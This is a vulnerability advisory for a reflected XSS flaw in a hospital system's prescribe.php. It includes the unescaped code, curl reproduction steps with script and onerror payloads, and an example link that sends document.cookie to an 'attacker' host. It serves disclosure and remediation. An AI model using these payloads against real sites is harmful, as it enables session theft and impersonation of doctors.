### Title

Reflected XSS in `prescribe.php` allows arbitrary JavaScript execution via crafted `prescribe.php?fname=...` links

### Summary

`prescribe.php` reads `$_GET['pid']`, `$_GET['ID']`, `$_GET['appdate']`, `$_GET['apptime']`, `$_GET['fname']`, and `$_GET['lname']` and renders them verbatim into hidden form fields with `value="<? echo $fname ?>"`. Because the value is interpolated without `htmlspecialchars()`, an attacker can break out of the `value` attribute and inject an arbitrary `<script>` block. The page is reachable without authentication, so any unauthenticated attacker can deliver the XSS simply by making a doctor visit a crafted link.

### Affected Version

Commit: `bc3bb9cbadfb2b1afb36660b5119ff42a03a7a25`

### Vulnerability Type

Reflected Cross-Site Scripting (CWE-79)

### Affected Code

File: `prescribe.php`

```php
if(isset($_GET['pid']) && isset($_GET['ID']) && ($_GET['appdate']) && isset($_GET['apptime']) && isset($_GET['fname']) && isset($_GET['lname'])) {
    $pid = $_GET['pid'];
    $ID = $_GET['ID'];
    $fname = $_GET['fname'];
    $lname = $_GET['lname'];
    $appdate = $_GET['appdate'];
    $apptime = $_GET['apptime'];
}
```

```html
<input type="hidden" name="fname" value="<? echo $fname ?>" />
<input type="hidden" name="lname" value="<? echo $lname ?>" />
<input type="hidden" name="appdate" value="<? echo $appdate ?>" />
<input type="hidden" name="apptime" value="<? echo $apptime ?>" />
<input type="hidden" name="pid" value="<? echo $pid ?>" />
<input type="hidden" name="ID" value="<? echo $ID ?>" />
```

### Root Cause

The handler reads from `$_GET` and writes the values directly into HTML attribute values without any escaping. The use of `<? echo ... ?>` (short echo) does not apply HTML escaping, so any meta-character supplied as a query parameter is rendered as HTML.

### Steps to Reproduce

1. Deploy the application and set `BASE_URL`.

```bash
BASE_URL="http://hms.localhost"
```

2. Send a request to `prescribe.php` with a script payload in the `fname` parameter:

```bash
curl -sS "$BASE_URL/prescribe.php?pid=1&ID=1&appdate=2020-01-01&apptime=10:00:00&fname=%22%3E%3Cscript%3Ealert(%27XSS%27)%3C%2Fscript%3E&lname=test"
```

Observed response (relevant excerpt):

```html
<input type="hidden" name="fname" value=""><script>alert('XSS')</script>" />
```

The browser parses the second `<script>` tag and executes the `alert('XSS')` payload inside the application origin.

3. Confirm the same primitive works for any of the six parameters. For example, `lname`:

```bash
curl -sS "$BASE_URL/prescribe.php?pid=1&ID=1&appdate=2020-01-01&apptime=10:00:00&fname=test&lname=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E"
```

```html
<input type="hidden" name="lname" value="<img src=x onerror=alert(1)>" />
```

4. The same payload is also reflected in the `Welcome` heading at the top of the page (`Welcome &nbsp<?php echo $doctor ?> <?php echo $pid?>`) when the user has a session, and in the `value` of the `pid` field, so multiple injection points exist.

### Impact

An unauthenticated attacker can craft a malicious URL such as

```text
http://hms.localhost/prescribe.php?pid=1&ID=1&appdate=2020-01-01&apptime=10:00:00
                  &fname=%22%3E%3Cscript%3Efetch('http://attacker/?c='+document.cookie)%3C%2Fscript%3E
                  &lname=test
```

and send it to a doctor. When the doctor opens the link, the script executes in the application origin. Because the session cookie is not `HttpOnly`, the script can exfiltrate `PHPSESSID` and impersonate the doctor. The same primitive lets the attacker pivot to the receptionist dashboard via the CSRF primitive discussed in CVE-14.

### CVSS 3.1

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N
Score: 9.0 (Critical)
```
